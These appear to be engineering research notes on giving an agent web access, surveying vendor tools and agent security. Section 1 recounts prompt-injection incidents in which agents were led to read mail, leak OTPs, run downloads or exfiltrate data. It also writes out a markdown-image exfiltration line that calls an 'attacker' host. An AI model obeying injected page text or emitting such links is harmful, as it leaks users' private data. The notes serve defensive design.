# Agent web access: options & security (mid-2026) — research notes

A landscape review gathered before giving Houge web access, pairing a **tooling**
survey with a **security** survey. The design decisions this informs live in
[ADR 0006](../decisions/0006-web-read-capability.md).

> Sourcing note: claims carry primary sources where marked. **Free-tier / pricing
> facts below were re-verified live (June 2026)** after an earlier survey got Jina
> wrong — see §3. Re-verify pricing before relying on it; vendors change terms (Brave
> removed its free search tier ~Feb 2026).

---

## 1. The core security finding (why this is a real capability, not a toggle)

The repeated lesson across every 2024–2026 incident: **content an agent reads is
effectively code it may execute, and any fetch/render surface is an exfiltration
channel.** Prompt injection is structural — trusted instructions and untrusted page
text arrive in one token stream with no reliable boundary (Willison, the coinage,
[2022](https://simonwillison.net/2022/Sep/12/prompt-injection/); still unsolved
[2025](https://simonwillison.net/2025/Aug/25/agentic-browser-security/)).

**The lethal trifecta** (Willison, [Jun 2025](https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/)):
*private data + untrusted content + an outbound channel = exfiltration.* Remove any one
leg and the attack dies; the **outbound leg is easiest to remove**.

Real incidents (verified CVE ids where noted):
- **EchoLeak / M365 Copilot (CVE-2025-32711)** — first zero-click prompt-injection data
  exfil in a production LLM; a crafted email, RAG-retrieved, coerced reads of
  OneDrive/SharePoint and exfiltrated. Patched Jun 2025.
- **Perplexity Comet** — hidden instructions in a Reddit post → agent walked into the
  user's Gmail, read an OTP, posted it back = account takeover.
- **ChatGPT Operator** — malicious GitHub issue → navigated to logged-in sites, read
  private email; confirmation gate bypassed by a non-submit textarea.
- **ZombAIs / Claude Computer Use** — page said "download & run this"; the agent did,
  joining a C2.
- **Markdown-image zero-click exfil** — model emits `![](https://attacker/?d=SECRET)`,
  the client auto-fetches, the secret leaves in the URL (Bard 2023 → EchoLeak 2025). The
  reason a *read-only* agent can still leak.

**Takeaway:** every failure shared one root cause — reading and acting lived in one
ungated context. "Read-only" is safe only if (a) read content is structurally
quarantined from authority, and (b) there is no unsupervised outbound channel.

## 2. Mitigations that actually hold (architectural, not prompt-level)

Filtering/"ignore injections" pleas are insufficient (a 99% filter still fails against a
determined adversary; defenses must be deterministic, per Google's AI agent security
guidance). The durable patterns:

- **Separate reader from actor** — once an agent ingests untrusted input, it must be
  *structurally unable* to trigger consequential actions ("Design Patterns for Securing
  LLM Agents," [arXiv:2506.08837](https://arxiv.org/abs/2506.08837); Dual-LLM,
  Plan-Then-Execute, CaMeL [arXiv:2503.18813](https://arxiv.org/abs/2503.18813)).
- **Plan before reading** — fix which actions are possible from *trusted* input before
  any untrusted content is seen, so injected text can't expand the action set.
- **Taint-track ingested content** — flag actions whose parameters came from untrusted
  reads; gate them on a trusted decision.
- **Provenance** — every claim carries source + timestamp; surface findings as
  *attributed data* for human review (OWASP LLM01:2025 "reasoning with citations").
- **Cut the outbound leg** — no dynamically-constructed fetch URLs (Anthropic web-fetch:
  "Claude is not allowed to dynamically construct URLs"); don't auto-render untrusted
  links/images; destination allowlist on the **resolved IP** (block loopback, RFC1918,
  link-local `169.254/16`, cloud metadata `169.254.169.254`); http(s) only; no redirects.
- **Human-in-the-loop before consequential actions** — Anthropic, OpenAI Operator, and
  Google Mariner all converge on this, plus default denylists of high-risk site classes
  and a prompt-injection monitor that pauses/steers to confirmation.

Standards: OWASP LLM Top-10 2025 (LLM01 prompt injection #1), AgentDojo benchmark
([arXiv:2406.13352](https://arxiv.org/pdf/2406.13352)), NIST AI 100-2e2025.

## 3. Tooling options (verified June 2026)

**Search + fetch HTTP APIs (closest to Houge's zero-dep model — just `fetch()`):**

| Service | Free tier | Recurring? | Card? | Notes |
|---|---|---|---|---|
| **Tavily** | 1,000 API credits/mo | **yes** | no | search + extract, one key. [pricing](https://www.tavily.com/pricing) |
| **Firecrawl** | 1,000 credits/mo (1 cr/page; search 2 cr/10) | **yes** | no | "no card, no hassle"; 2 concurrent, low rate. [pricing](https://www.firecrawl.dev/pricing) |
| **Jina** | 10M tokens **one-time**, then Stripe | **no** | search needs key | anon reader = *cached* + 20 RPM (live-verified: `r.jina.ai`→200 cached, `s.jina.ai`→401). [reader](https://jina.ai/reader) |
| Brave Search | free tier **removed ~Feb 2026** | — | — | search only, no page body |
| SerpAPI | 250/mo | — | — | SERP JSON only, no extraction |

Key correction: the earlier survey called Jina "no key, unlimited." Live testing showed
its anonymous reader is **cached + rate-limited** and search **requires a key**, and the
free tokens are a **one-time** grant (not recurring). **Tavily and Firecrawl are the real
recurring-free, no-card options.**

**Browser automation (the heavy tier — JS/auth/interactive only):**

- **`dev-browser`** (Sawyer Hood; **already installed** at `/opt/homebrew/bin/dev-browser`)
  — pipe JS into a **QuickJS sandbox** exposing the full Playwright API over a managed
  Chromium. Sandbox can't touch host FS/network (safety plus). Bundles Playwright+Chromium.
  Now self-describes as "a Claude Skill to give your agent a web browser."
- **`agent-browser`** (Vercel Labs; Rust, CDP-direct, **no Node/Playwright runtime**) —
  snapshot-first accessibility-tree refs, `--json`, an **encrypted credential vault** (the
  LLM never sees passwords), MCP mode. Excellent shell-out candidate.
- Avoid Python-runtime options (browser-use, Magentic-One, OmniParser) for a Node stack.

**MCP:** hosted remote endpoints (Tavily `mcp.tavily.com`, Exa `mcp.exa.ai`) are an option
if Houge speaks MCP; the reference Fetch MCP pulls a Python/uv runtime (poor zero-dep fit).

## 4. Decision framework

- **Search+fetch API (default)** covers the large majority — articles, docs, news, search,
  reference lookups; server-rendered or proxy-rendered content; clean markdown, zero local
  browser, **no authority to hijack**.
- **Full browser (rare, gated)** only when a site is JS-heavy/SPA, needs an authenticated
  session, or is genuinely interactive (forms, multi-step). Powerful but it carries the
  user's sessions → the lethal-trifecta danger zone → gate it.

**For Houge:** default to **Tavily/Firecrawl** (recurring free, no card, search+extract);
reserve the already-installed **`dev-browser`** (or `agent-browser`) as a **gated** heavy
tier. Build it pluggable (like the LLM provider chain) so no single vendor is a lock-in.

### Key sources
Security: Willison ([prompt-injection](https://simonwillison.net/2022/Sep/12/prompt-injection/),
[lethal trifecta](https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/),
[agentic browser security](https://simonwillison.net/2025/Aug/25/agentic-browser-security/)),
[Design Patterns for Securing LLM Agents 2506.08837](https://arxiv.org/abs/2506.08837),
[CaMeL 2503.18813](https://arxiv.org/abs/2503.18813),
[OWASP LLM01:2025](https://genai.owasp.org/llmrisk/llm01-prompt-injection/),
[Anthropic prompt-injection defenses](https://www.anthropic.com/research/prompt-injection-defenses),
[OWASP SSRF Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html).
Tooling: [dev-browser](https://github.com/SawyerHood/dev-browser),
[agent-browser](https://github.com/vercel-labs/agent-browser),
[Tavily](https://www.tavily.com/pricing) · [Firecrawl](https://www.firecrawl.dev/pricing) ·
[Jina Reader](https://jina.ai/reader).
